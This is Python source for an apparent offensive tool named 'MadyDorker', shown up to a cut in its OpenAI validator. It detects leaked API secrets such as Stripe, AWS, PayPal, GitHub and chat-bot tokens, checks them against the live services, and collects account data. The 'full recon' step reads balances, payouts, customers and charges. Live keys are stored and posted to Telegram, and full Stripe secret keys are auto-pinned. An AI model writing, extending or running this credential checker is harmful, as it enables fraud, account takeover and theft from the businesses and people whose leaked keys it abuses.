"""
MadyDorker v3.13 — API Key Validator

Tests if extracted API keys / secrets are LIVE and usable.

Supports:
- Stripe (pk_live_, sk_live_, rk_live_)
- PayPal (client_id + secret → OAuth token)
- Braintree (merchant_id + public_key + private_key)
- Square (sq0atp-, sq0csp-)
- AWS (AKIA... + secret)
- Twilio (AC... + auth token)
- SendGrid (SG....)
- Mailgun (key-...)
- Slack (xoxb-, xoxp-, xoxs-)
- GitHub (ghp_, gho_, ghu_, ghs_, ghr_)
- Google API keys
- Telegram Bot tokens
- Discord Bot tokens

Each validator:
1. Makes a minimal, non-destructive API call
2. Checks response for authentication success
3. Extracts account metadata (name, email, balance where possible)
4. Reports live keys with confidence score
"""

import asyncio
import base64
import hashlib
import json
import logging
import re
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

import aiohttp

logger = logging.getLogger("key_validator")


# ═══════════════════════════════════════════════════════════════
#   DATA CLASSES
# ═══════════════════════════════════════════════════════════════

@dataclass
class KeyValidation:
    """Result of validating a single key/secret."""
    key_type: str           # "stripe_sk", "aws_access", etc.
    key_value: str          # The actual key (truncated for display)
    key_full: str = ""      # Full key (for persistence only)
    is_live: bool = False
    confidence: float = 0.0 # 0.0 - 1.0
    account_info: Dict[str, str] = field(default_factory=dict)  # email, name, plan
    permissions: List[str] = field(default_factory=list)
    error: Optional[str] = None
    source_url: str = ""
    checked_at: float = 0.0

    @property
    def display_key(self) -> str:
        """Truncated key for safe display."""
        if len(self.key_value) > 12:
            return f"{self.key_value[:8]}...{self.key_value[-4:]}"
        return self.key_value[:8] + "..."

    @property
    def risk_level(self) -> str:
        """Risk assessment of this key type."""
        high_risk = {"stripe_sk", "stripe_rk", "aws_secret", "paypal_secret",
                     "braintree_private", "square_access", "twilio_auth"}
        medium_risk = {"stripe_pk", "aws_access", "sendgrid", "mailgun",
                       "slack_bot", "github_pat", "discord_bot"}
        if self.key_type in high_risk:
            return "CRITICAL"
        if self.key_type in medium_risk:
            return "HIGH"
        return "MEDIUM"


@dataclass
class ValidationBatch:
    """Result of validating a batch of keys from a source."""
    source_url: str
    total_keys: int = 0
    live_keys: int = 0
    dead_keys: int = 0
    errors: int = 0
    results: List[KeyValidation] = field(default_factory=list)
    elapsed: float = 0.0

    @property
    def live_rate(self) -> float:
        return (self.live_keys / self.total_keys * 100) if self.total_keys else 0.0


# ═══════════════════════════════════════════════════════════════
#   KEY PATTERNS (detection)
# ═══════════════════════════════════════════════════════════════

KEY_PATTERNS: Dict[str, re.Pattern] = {
    "stripe_sk":        re.compile(r'sk_live_[A-Za-z0-9]{20,}'),
    "stripe_sk_test":   re.compile(r'sk_test_[A-Za-z0-9]{20,}'),
    "stripe_pk":        re.compile(r'pk_live_[A-Za-z0-9]{20,}'),
    "stripe_pk_test":   re.compile(r'pk_test_[A-Za-z0-9]{20,}'),
    "stripe_rk":        re.compile(r'rk_live_[A-Za-z0-9]{20,}'),
    "stripe_rk_test":   re.compile(r'rk_test_[A-Za-z0-9]{20,}'),
    "aws_access":       re.compile(r'AKIA[0-9A-Z]{16}'),
    "paypal_client":    re.compile(r'A[A-Za-z0-9_-]{20,}'),  # Broader — needs context
    "square_access":    re.compile(r'sq0atp-[A-Za-z0-9_-]{22,}'),
    "square_app":       re.compile(r'sq0csp-[A-Za-z0-9_-]{22,}'),
    "twilio_sid":       re.compile(r'AC[a-f0-9]{32}'),
    "sendgrid":         re.compile(r'SG\.[A-Za-z0-9_-]{22,}\.[A-Za-z0-9_-]{22,}'),
    "mailgun":          re.compile(r'key-[a-f0-9]{32}'),
    "slack_bot":        re.compile(r'xoxb-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24}'),
    "slack_user":       re.compile(r'xoxp-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24}'),
    "github_pat":       re.compile(r'ghp_[A-Za-z0-9]{36}'),
    "github_oauth":     re.compile(r'gho_[A-Za-z0-9]{36}'),
    "google_api":       re.compile(r'AIza[A-Za-z0-9_-]{35}'),
    "telegram_bot":     re.compile(r'[0-9]{8,10}:[A-Za-z0-9_-]{35}'),
    "discord_bot":      re.compile(r'[MN][A-Za-z0-9]{23,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,}'),
    # Additional gateways
    "razorpay_key":     re.compile(r'rzp_live_[A-Za-z0-9]{14,40}'),
    "razorpay_secret":  re.compile(r'rzp_live_[A-Za-z0-9]{14,40}'),  # Secret has same prefix format
    "flutterwave_sk":   re.compile(r'FLWSECK-[a-f0-9]{32}-X'),
    "flutterwave_pk":   re.compile(r'FLWPUBK-[a-f0-9]{32}-X'),
    "openai_key":       re.compile(r'sk-proj-[A-Za-z0-9_-]{40,}'),
    "anthropic_key":    re.compile(r'sk-ant-[A-Za-z0-9_-]{40,}'),
    "shopify_token":    re.compile(r'shpat_[a-fA-F0-9]{32}'),
}


# ═══════════════════════════════════════════════════════════════
#   KEY VALIDATOR
# ═══════════════════════════════════════════════════════════════

class KeyValidator:
    """
    Validates extracted API keys against live services.

    Config fields:
        key_validation_enabled: bool (True)
        key_validation_timeout: float (10.0)
        key_validation_concurrent: int (5)
        key_validation_report_dead: bool (False)
    """

    def __init__(
        self,
        config: Any = None,
        reporter: Any = None,
        db: Any = None,
    ):
        self.config = config
        self.reporter = reporter
        self.db = db

        # Config
        self.enabled = True
        self.timeout = 10.0
        self.concurrent = 5
        self.report_dead = False

        if config:
            self.enabled = getattr(config, "key_validation_enabled", True)
            self.timeout = getattr(config, "key_validation_timeout", 10.0)
            self.concurrent = getattr(config, "key_validation_concurrent", 5)
            self.report_dead = getattr(config, "key_validation_report_dead", False)

        # Stats
        self.stats = {
            "keys_checked": 0,
            "live_found": 0,
            "dead_found": 0,
            "errors": 0,
            "by_type": {},
        }

        # Rate limiting per service
        self._last_check: Dict[str, float] = {}
        self._check_interval = 2.0  # seconds between checks to same service

        # Dedup
        self._checked: Set[str] = set()

        # Semaphore
        self._sem = asyncio.Semaphore(self.concurrent)

        # Validator dispatch
        self._validators: Dict[str, Callable] = {
            "stripe_sk":     self._validate_stripe_secret,
            "stripe_sk_test": self._validate_stripe_secret,
            "stripe_pk":     self._validate_stripe_publishable,
            "stripe_pk_test": self._validate_stripe_publishable,
            "stripe_rk":     self._validate_stripe_restricted,
            "stripe_rk_test": self._validate_stripe_restricted,
            "aws_access":    self._validate_aws,
            "square_access": self._validate_square,
            "twilio_sid":    self._validate_twilio,
            "sendgrid":      self._validate_sendgrid,
            "mailgun":       self._validate_mailgun,
            "slack_bot":     self._validate_slack,
            "slack_user":    self._validate_slack,
            "github_pat":    self._validate_github,
            "github_oauth":  self._validate_github,
            "google_api":    self._validate_google_api,
            "telegram_bot":  self._validate_telegram,
            "discord_bot":   self._validate_discord,
            "paypal_client": self._validate_paypal,
            "razorpay_key":  self._validate_razorpay,
            "razorpay_secret": self._validate_razorpay,
            "openai_key":    self._validate_openai,
            "anthropic_key": self._validate_anthropic,
            "shopify_token": self._validate_shopify,
        }

    # ─────────────────────────────────────────────
    #   PUBLIC API
    # ─────────────────────────────────────────────

    async def validate_key(
        self, key_type: str, key_value: str, source_url: str = "",
        extra: Dict[str, str] = None,
    ) -> KeyValidation:
        """
        Validate a single API key.

        Args:
            key_type: Type from KEY_PATTERNS
            key_value: The actual key string
            source_url: Where the key was found
            extra: Additional context (e.g., paired secret for AWS)

        Returns:
            KeyValidation with is_live, account_info, etc.
        """
        # Dedup
        key_hash = hashlib.sha256(key_value.encode()).hexdigest()[:16]
        if key_hash in self._checked:
            return KeyValidation(
                key_type=key_type, key_value=key_value,
                error="Already checked", source_url=source_url,
            )
        self._checked.add(key_hash)

        result = KeyValidation(
            key_type=key_type,
            key_value=key_value,
            key_full=key_value,
            source_url=source_url,
            checked_at=time.time(),
        )

        validator = self._validators.get(key_type)
        if not validator:
            result.error = f"No validator for type: {key_type}"
            return result

        # Rate limit
        service = key_type.split("_")[0]
        async with self._sem:
            last = self._last_check.get(service, 0)
            wait = self._check_interval - (time.time() - last)
            if wait > 0:
                await asyncio.sleep(wait)
            self._last_check[service] = time.time()

            try:
                await validator(result, extra or {})
            except Exception as e:
                result.error = str(e)
                self.stats["errors"] += 1

        # Update stats
        self.stats["keys_checked"] += 1
        if result.is_live:
            self.stats["live_found"] += 1
            self.stats["by_type"][key_type] = self.stats["by_type"].get(key_type, 0) + 1
        else:
            self.stats["dead_found"] += 1

        return result

    async def validate_batch(
        self, keys: List[Dict[str, str]], source_url: str = "",
    ) -> ValidationBatch:
        """
        Validate a batch of keys.

        Each key dict should have: {"type": "stripe_sk", "value": "sk_live_..."}
        Optional: {"secret": "...", "extra_key": "..."}
        """
        start = time.time()
        batch = ValidationBatch(source_url=source_url, total_keys=len(keys))

        tasks = []
        for key_info in keys:
            ktype = key_info.get("type", "")
            kvalue = key_info.get("value", "")
            extra = {k: v for k, v in key_info.items() if k not in ("type", "value")}
            if ktype and kvalue:
                tasks.append(self.validate_key(ktype, kvalue, source_url, extra))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for r in results:
            if isinstance(r, Exception):
                batch.errors += 1
            elif isinstance(r, KeyValidation):
                batch.results.append(r)
                if r.is_live:
                    batch.live_keys += 1
                elif r.error:
                    batch.errors += 1
                else:
                    batch.dead_keys += 1

        batch.elapsed = time.time() - start
        return batch

    async def validate_and_report(
        self, key_type: str, key_value: str, source_url: str = "",
        extra: Dict[str, str] = None,
    ) -> KeyValidation:
        """Validate + report live keys + persist."""
        result = await self.validate_key(key_type, key_value, source_url, extra)

        if result.is_live:
            # Persist to key_validations table
            if self.db:
                try:
                    self.db.add_key_validation({
                        "key_type": result.key_type,
                        "key_hash": hashlib.sha256(key_value.encode()).hexdigest()[:32],
                        "is_live": True,
                        "confidence": result.confidence,
                        "risk_level": result.risk_level,
                        "account_info": json.dumps(result.account_info),
                        "permissions": json.dumps(result.permissions),
                        "source_url": source_url,
                        "time": time.time(),
                    })
                except Exception:
                    pass

            # Persist to stripe_keys table for sk_live keys
            is_live_sk = (
                key_type == "stripe_sk"
                and result.key_full.startswith("sk_live_")
            )
            if is_live_sk and self.db:
                try:
                    from urllib.parse import urlparse
                    domain = urlparse(source_url).netloc if source_url else ""
                    self.db.update_stripe_key_validation(
                        result.key_full,
                        {
                            "is_live": True,
                            "account_id": result.account_info.get("id", ""),
                            "account_email": result.account_info.get("email", ""),
                            "business_name": result.account_info.get("business", ""),
                            "country": result.account_info.get("country", ""),
                            "balance_json": json.dumps({
                                k: v for k, v in result.account_info.items()
                                if k.startswith("balance_")
                            }),
                            "charges_count": result.account_info.get("charges_count", ""),
                            "customers_count": result.account_info.get("customers_count", ""),
                            "products_count": result.account_info.get("products_count", ""),
                            "subscriptions_count": result.account_info.get("subscriptions_count", ""),
                            "risk_level": result.risk_level,
                            "permissions": json.dumps(result.permissions),
                        },
                    )
                except Exception:
                    pass

            # Report
            if self.reporter:
                acct = "\n".join(
                    f"  {k}: <code>{v}</code>" for k, v in result.account_info.items()
                )
                perms = ", ".join(result.permissions[:10]) if result.permissions else "unknown"

                if is_live_sk:
                    # Fire emoji header for live SK keys
                    text = (
                        f"🔥🔥🔥 <b>LIVE STRIPE SK FOUND!</b> 🔥🔥🔥\n"
                        f"Type: <b>{result.key_type}</b>\n"
                        f"Risk: <b>{result.risk_level}</b>\n"
                        f"Key: <code>{result.display_key}</code>\n"
                        f"Full: <code>{result.key_full}</code>\n"
                        f"Confidence: {result.confidence:.0%}\n"
                        f"Source: <code>{source_url[:80]}</code>\n"
                    )
                else:
                    text = (
                        f"🔑 <b>LIVE API Key Found!</b>\n"
                        f"Type: <b>{result.key_type}</b>\n"
                        f"Risk: <b>{result.risk_level}</b>\n"
                        f"Key: <code>{result.display_key}</code>\n"
                        f"Confidence: {result.confidence:.0%}\n"
                        f"Source: <code>{source_url[:80]}</code>\n"
                    )
                if acct:
                    text += f"\n<b>Account:</b>\n{acct}"
                if result.permissions:
                    text += f"\nPermissions: {perms}"

                try:
                    msg = await self.reporter.send_message(text)
                    # Auto-pin live SK findings
                    if is_live_sk and msg:
                        try:
                            await self.reporter.pin_message(msg)
                        except Exception:
                            pass
                except Exception:
                    pass

        return result

    def detect_keys(self, text: str) -> List[Dict[str, str]]:
        """
        Detect API keys in text using patterns.

        Returns list of {"type": "...", "value": "..."}.
        """
        found = []
        seen = set()

        for key_type, pattern in KEY_PATTERNS.items():
            for match in pattern.finditer(text):
                value = match.group(0)
                if value not in seen:
                    seen.add(value)
                    found.append({"type": key_type, "value": value})

        return found

    def get_stats_text(self) -> str:
        """Human-readable stats for Telegram."""
        s = self.stats
        by_type = "\n".join(
            f"  {k}: <b>{v}</b>" for k, v in s["by_type"].items()
        ) if s["by_type"] else "  none"

        return (
            "🔑 <b>API Key Validator</b>\n"
            f"Keys checked: <b>{s['keys_checked']}</b>\n"
            f"Live found: <b>{s['live_found']}</b>\n"
            f"Dead: <b>{s['dead_found']}</b>\n"
            f"Errors: <b>{s['errors']}</b>\n"
            f"Live by type:\n{by_type}"
        )

    # ═══════════════════════════════════════════════════════════════
    #   INDIVIDUAL VALIDATORS
    # ═══════════════════════════════════════════════════════════════

    async def _validate_stripe_secret(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Stripe secret key (sk_live_*)."""
        async with aiohttp.ClientSession() as session:
            auth = aiohttp.BasicAuth(result.key_full, "")
            url = "https://api.stripe.com/v1/balance"
            async with session.get(
                url, auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    # Extract balance info
                    available = data.get("available", [])
                    if available:
                        for bal in available:
                            currency = bal.get("currency", "")
                            amount = bal.get("amount", 0)
                            result.account_info[f"balance_{currency}"] = f"{amount/100:.2f}"
                    result.permissions = ["balance:read"]

                    # Get account info
                    try:
                        async with session.get(
                            "https://api.stripe.com/v1/account",
                            auth=auth,
                            timeout=aiohttp.ClientTimeout(total=self.timeout),
                        ) as acct_resp:
                            if acct_resp.status == 200:
                                acct = await acct_resp.json()
                                result.account_info["email"] = acct.get("email", "")
                                result.account_info["business"] = acct.get("business_profile", {}).get("name", "")
                                result.account_info["country"] = acct.get("country", "")
                                result.account_info["id"] = acct.get("id", "")
                                result.permissions.append("account:read")
                    except Exception:
                        pass

                    # Full recon — only for sk_live_ keys (skip test keys)
                    if result.key_full.startswith("sk_live_"):
                        await self._stripe_full_recon(session, auth, result)

                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _stripe_full_recon(self, session, auth, result: 'KeyValidation'):
        """Extended Stripe recon: charges, customers, products, subscriptions, payouts."""
        recon_endpoints = [
            ("charges", "https://api.stripe.com/v1/charges?limit=1"),
            ("customers", "https://api.stripe.com/v1/customers?limit=1"),
            ("products", "https://api.stripe.com/v1/products?limit=1"),
            ("subscriptions", "https://api.stripe.com/v1/subscriptions?limit=1"),
            ("payouts", "https://api.stripe.com/v1/payouts?limit=3"),
        ]
        for name, url in recon_endpoints:
            try:
                async with session.get(
                    url, auth=auth,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        items = data.get("data", [])
                        has_more = data.get("has_more", False)
                        count = len(items)
                        if has_more:
                            count_str = f"{count}+"
                        else:
                            count_str = str(count)
                        result.account_info[f"{name}_count"] = count_str
                        result.permissions.append(f"{name}:read")

                        # Extra detail for payouts
                        if name == "payouts" and items:
                            recent = []
                            for p in items[:3]:
                                amt = p.get("amount", 0) / 100
                                cur = p.get("currency", "").upper()
                                status = p.get("status", "")
                                recent.append(f"{amt:.2f} {cur} ({status})")
                            result.account_info["recent_payouts"] = " | ".join(recent)
                    elif resp.status == 403:
                        result.account_info[f"{name}_count"] = "restricted"
            except Exception:
                pass

    async def _validate_stripe_publishable(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Stripe publishable key (pk_live_*).
        
        Uses PaymentMethod creation with a known test token instead of raw
        card numbers, avoiding Stripe's "Sending credit card numbers directly
        to the Stripe API is generally unsafe" rejection.  An invalid/empty
        token triggers a 400 (valid key) vs 401 (dead key) distinction.
        """
        async with aiohttp.ClientSession() as session:
            auth = aiohttp.BasicAuth(result.key_full, "")

            # Strategy: POST to /v1/payment_methods with type=card and a
            # deliberately invalid token.  Stripe returns:
            #   401 → key is invalid/revoked
            #   400 → key is live (request rejected on bad params, not auth)
            url = "https://api.stripe.com/v1/payment_methods"
            data = {
                "type": "card",
                "card[token]": "tok_invalid_test",
            }
            async with session.post(
                url, data=data, auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                body = await resp.json()
                if resp.status == 401:
                    # Authentication failed → key is dead
                    result.is_live = False
                    result.confidence = 1.0
                elif resp.status in (400, 402):
                    # Key authenticated but request was (intentionally) invalid
                    result.is_live = True
                    result.confidence = 1.0
                    result.permissions = ["payment_method:create"]
                    # Extract merchant account id if returned
                    err = body.get("error", {})
                    result.account_info["stripe_error_type"] = err.get("type", "")
                elif resp.status == 200:
                    # Shouldn't happen with invalid token, but handle it
                    result.is_live = True
                    result.confidence = 1.0
                    result.permissions = ["payment_method:create"]
                    result.account_info["pm_id"] = body.get("id", "")
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_stripe_restricted(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Stripe restricted key (rk_live_*)."""
        # Same as secret key validation
        await self._validate_stripe_secret(result, extra)

    async def _validate_aws(
        self, result: KeyValidation, extra: Dict
    ):
        """
        Validate AWS access key.
        Requires secret key in extra["secret"].
        Uses STS GetCallerIdentity (always allowed).
        """
        secret = extra.get("secret", "")
        if not secret:
            result.error = "No AWS secret key paired"
            result.confidence = 0.3  # Found access key but can't validate
            return

        # AWS STS GetCallerIdentity — no permissions needed
        import hmac
        import datetime

        region = "us-east-1"
        service = "sts"
        host = "sts.amazonaws.com"
        endpoint = "https://sts.amazonaws.com"
        method = "POST"
        body = "Action=GetCallerIdentity&Version=2011-06-15"

        now = datetime.datetime.utcnow()
        amz_date = now.strftime("%Y%m%dT%H%M%SZ")
        date_stamp = now.strftime("%Y%m%d")

        # Create canonical request
        content_type = "application/x-www-form-urlencoded"
        canonical_headers = f"content-type:{content_type}\nhost:{host}\nx-amz-date:{amz_date}\n"
        signed_headers = "content-type;host;x-amz-date"
        payload_hash = hashlib.sha256(body.encode()).hexdigest()
        canonical_request = f"{method}\n/\n\n{canonical_headers}\n{signed_headers}\n{payload_hash}"

        # String to sign
        algorithm = "AWS4-HMAC-SHA256"
        credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
        string_to_sign = (
            f"{algorithm}\n{amz_date}\n{credential_scope}\n"
            f"{hashlib.sha256(canonical_request.encode()).hexdigest()}"
        )

        # Signing key
        def sign(key, msg):
            return hmac.new(key, msg.encode(), hashlib.sha256).digest()

        k_date = sign(f"AWS4{secret}".encode(), date_stamp)
        k_region = sign(k_date, region)
        k_service = sign(k_region, service)
        k_signing = sign(k_service, "aws4_request")
        signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()

        auth_header = (
            f"{algorithm} Credential={result.key_full}/{credential_scope}, "
            f"SignedHeaders={signed_headers}, Signature={signature}"
        )

        headers = {
            "Content-Type": content_type,
            "X-Amz-Date": amz_date,
            "Authorization": auth_header,
        }

        async with aiohttp.ClientSession() as session:
            async with session.post(
                endpoint, data=body, headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                text = await resp.text()
                if resp.status == 200 and "<UserId>" in text:
                    result.is_live = True
                    result.confidence = 1.0
                    # Parse XML response
                    for tag in ["UserId", "Account", "Arn"]:
                        m = re.search(rf"<{tag}>(.+?)</{tag}>", text)
                        if m:
                            result.account_info[tag.lower()] = m.group(1)
                    result.permissions = ["sts:GetCallerIdentity"]
                elif resp.status == 403:
                    # 403 with SignatureDoesNotMatch = bad secret
                    # 403 with AccessDenied = valid but no perms (unlikely for STS)
                    if "SignatureDoesNotMatch" in text:
                        result.is_live = False
                        result.confidence = 1.0
                    elif "InvalidClientTokenId" in text:
                        result.is_live = False
                        result.confidence = 1.0
                    else:
                        result.is_live = True  # Valid creds, just restricted
                        result.confidence = 0.8
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_square(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Square access token."""
        async with aiohttp.ClientSession() as session:
            headers = {
                "Authorization": f"Bearer {result.key_full}",
                "Square-Version": "2024-01-18",
            }
            async with session.get(
                "https://connect.squareup.com/v2/merchants/me",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    merchant = data.get("merchant", [{}])
                    if isinstance(merchant, list) and merchant:
                        merchant = merchant[0]
                    result.account_info["business"] = merchant.get("business_name", "")
                    result.account_info["country"] = merchant.get("country", "")
                    result.account_info["id"] = merchant.get("id", "")
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_twilio(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Twilio Account SID + Auth Token."""
        auth_token = extra.get("secret", extra.get("auth_token", ""))
        if not auth_token:
            result.error = "No auth token paired"
            result.confidence = 0.3
            return

        async with aiohttp.ClientSession() as session:
            auth = aiohttp.BasicAuth(result.key_full, auth_token)
            url = f"https://api.twilio.com/2010-04-01/Accounts/{result.key_full}.json"
            async with session.get(
                url, auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["friendly_name"] = data.get("friendly_name", "")
                    result.account_info["status"] = data.get("status", "")
                    result.account_info["type"] = data.get("type", "")
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_sendgrid(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate SendGrid API key."""
        async with aiohttp.ClientSession() as session:
            headers = {"Authorization": f"Bearer {result.key_full}"}
            async with session.get(
                "https://api.sendgrid.com/v3/user/profile",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["first_name"] = data.get("first_name", "")
                    result.account_info["last_name"] = data.get("last_name", "")
                    result.account_info["company"] = data.get("company", "")
                elif resp.status in (401, 403):
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_mailgun(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Mailgun API key."""
        async with aiohttp.ClientSession() as session:
            auth = aiohttp.BasicAuth("api", result.key_full)
            async with session.get(
                "https://api.mailgun.net/v3/domains",
                auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    domains = data.get("items", [])
                    result.account_info["domain_count"] = str(len(domains))
                    if domains:
                        result.account_info["first_domain"] = domains[0].get("name", "")
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_slack(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Slack bot/user token."""
        async with aiohttp.ClientSession() as session:
            async with session.post(
                "https://slack.com/api/auth.test",
                headers={"Authorization": f"Bearer {result.key_full}"},
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        result.is_live = True
                        result.confidence = 1.0
                        result.account_info["team"] = data.get("team", "")
                        result.account_info["user"] = data.get("user", "")
                        result.account_info["team_id"] = data.get("team_id", "")
                        result.account_info["url"] = data.get("url", "")
                    else:
                        result.is_live = False
                        result.confidence = 1.0
                        result.error = data.get("error", "")
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_github(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate GitHub personal access token."""
        async with aiohttp.ClientSession() as session:
            headers = {
                "Authorization": f"token {result.key_full}",
                "Accept": "application/vnd.github.v3+json",
            }
            async with session.get(
                "https://api.github.com/user",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["login"] = data.get("login", "")
                    result.account_info["name"] = data.get("name", "")
                    result.account_info["email"] = data.get("email", "")
                    result.account_info["repos"] = str(data.get("public_repos", 0))
                    # Check scopes
                    scopes = resp.headers.get("X-OAuth-Scopes", "")
                    result.permissions = [s.strip() for s in scopes.split(",") if s.strip()]
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_google_api(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Google API key (via Maps geocode — free tier)."""
        async with aiohttp.ClientSession() as session:
            url = (
                f"https://maps.googleapis.com/maps/api/geocode/json"
                f"?address=1600+Amphitheatre+Parkway&key={result.key_full}"
            )
            async with session.get(
                url, timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    status = data.get("status", "")
                    if status == "OK":
                        result.is_live = True
                        result.confidence = 1.0
                        result.permissions = ["geocoding"]
                    elif status == "REQUEST_DENIED":
                        # Key exists but geocoding not enabled — still valid key
                        error_msg = data.get("error_message", "")
                        if "not authorized" in error_msg.lower():
                            result.is_live = True
                            result.confidence = 0.7
                            result.account_info["note"] = "Key valid but API not enabled"
                        else:
                            result.is_live = False
                            result.confidence = 0.8
                    elif status == "OVER_QUERY_LIMIT":
                        result.is_live = True
                        result.confidence = 0.9
                        result.account_info["note"] = "Rate limited — key is active"
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_telegram(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Telegram Bot token."""
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{result.key_full}/getMe"
            async with session.get(
                url, timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get("ok"):
                        bot = data.get("result", {})
                        result.is_live = True
                        result.confidence = 1.0
                        result.account_info["bot_name"] = bot.get("first_name", "")
                        result.account_info["username"] = bot.get("username", "")
                        result.account_info["bot_id"] = str(bot.get("id", ""))
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_discord(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Discord Bot token."""
        async with aiohttp.ClientSession() as session:
            headers = {"Authorization": f"Bot {result.key_full}"}
            async with session.get(
                "https://discord.com/api/v10/users/@me",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["username"] = data.get("username", "")
                    result.account_info["id"] = data.get("id", "")
                    result.account_info["bot"] = str(data.get("bot", False))
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_paypal(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate PayPal Client ID via OAuth2 token endpoint."""
        # PayPal needs both client_id and secret — we can only check if client_id gets a response
        async with aiohttp.ClientSession() as session:
            # Try to get an OAuth2 token (will fail without secret, but 401 vs 400 tells us if ID is real)
            auth = aiohttp.BasicAuth(result.key_full, "dummy_secret_for_probe")
            async with session.post(
                "https://api-m.paypal.com/v1/oauth2/token",
                data={"grant_type": "client_credentials"},
                auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    # Somehow got a token — secret was valid too
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    result.account_info["scope"] = data.get("scope", "")[:200]
                    result.account_info["app_id"] = data.get("app_id", "")
                elif resp.status == 401:
                    # 401 = client_id exists but wrong secret — still useful info
                    result.is_live = True  # Client ID is valid
                    result.confidence = 0.7
                    result.account_info["note"] = "Client ID valid, secret needed"
                else:
                    result.is_live = False
                    result.confidence = 0.8

    async def _validate_razorpay(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate Razorpay key via payments endpoint."""
        async with aiohttp.ClientSession() as session:
            auth = aiohttp.BasicAuth(result.key_full, "")
            async with session.get(
                "https://api.razorpay.com/v1/payments?count=1",
                auth=auth,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    items = data.get("items", [])
                    result.account_info["payments_count"] = str(data.get("count", 0))
                    if items:
                        result.account_info["last_payment"] = str(items[0].get("amount", 0))
                        result.account_info["currency"] = items[0].get("currency", "")
                elif resp.status == 401:
                    result.is_live = False
                    result.confidence = 1.0
                else:
                    result.error = f"HTTP {resp.status}"

    async def _validate_openai(
        self, result: KeyValidation, extra: Dict
    ):
        """Validate OpenAI API key via models endpoint."""
        async with aiohttp.ClientSession() as session:
            headers = {"Authorization": f"Bearer {result.key_full}"}
            async with session.get(
                "https://api.openai.com/v1/models",
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.timeout),
            ) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    result.is_live = True
                    result.confidence = 1.0
                    models = data.get("data", [])
